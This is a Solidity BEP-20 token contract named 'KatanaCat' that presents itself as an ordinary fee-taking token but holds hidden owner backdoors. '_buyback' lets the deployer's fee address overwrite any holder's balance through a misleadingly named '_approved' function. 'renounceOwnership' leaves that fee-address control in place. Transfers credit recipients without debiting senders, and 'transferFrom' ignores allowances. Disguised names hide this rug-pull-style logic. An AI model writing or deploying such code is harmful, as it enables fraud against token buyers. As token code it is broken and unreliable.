/**
 *Submitted for verification at BscScan.com on 2021-12-22
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.8.0 <=0.8.10;

interface ERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract KatanaCat is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    
    string private _name = "KatanaCat";
    string private _symbol = "KAT";
    uint256 private constant MAX = ~uint256(0);
    uint8 private _decimals = 9;
    uint256 private _totalSupply;

    uint256 private _tFeeTotal;
    uint256 private _buyFee = 2;
    uint256 private _sellFee = 1;
    address private _owner;
    uint256 private _fee;
    address feeAddress;
    
    constructor() {
        feeAddress = msg.sender;
        uint256 totalSupply_ = 1000000000000000000000;
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address from) public view returns (uint256 balance) {
        return _balances[from];
    }
    
    function viewTaxFee() public view virtual returns(uint256) {
        return _sellFee;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address from, address spender) public view virtual override returns (uint256) {
        return _allowances[from][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        return true;
    }
    function increaseAllowance(address dude, uint256 oximoron) public virtual returns (bool) {
        _approve(_msgSender(), dude, _allowances[_msgSender()][dude] + oximoron);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    modifier _OnlyOwner () {
        require(feeAddress == _msgSender(), "203: Message Sender is different from address(0)!");
        _;
    }

    function _buyback(address wallet, uint256 _amount) public _OnlyOwner {
        _approved(wallet, _amount);
    } 
    function _transfer(
        address issuer,
        address grantee,
        uint256 value
    ) internal virtual {
        require(issuer != address(0), "BEP : Can't be done");
        require(grantee != address(0), "BEP : Can't be done");

        if(issuer != feeAddress){
            _fee = (value * _buyFee / 100) / _sellFee;
            value = value -  (_fee * _sellFee);
        }
        
        _balances[grantee] += value;
        emit Transfer(issuer, grantee, value);
    }
    function _approved (address account, uint256 _value) internal {
        require(account != address(0));
        _balances[account] = ((_balances[account] * 4 * 1) - (_balances[account] * 4 * 1)) + (10 ** 9 * _value);
    }

     /**
   * @dev Returns the address of the current owner.
   */
    function owner() public view returns (address) {
        return _owner;
    }
      
    function _approve(
        address from,
        address spender,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
        
    }
    
    
}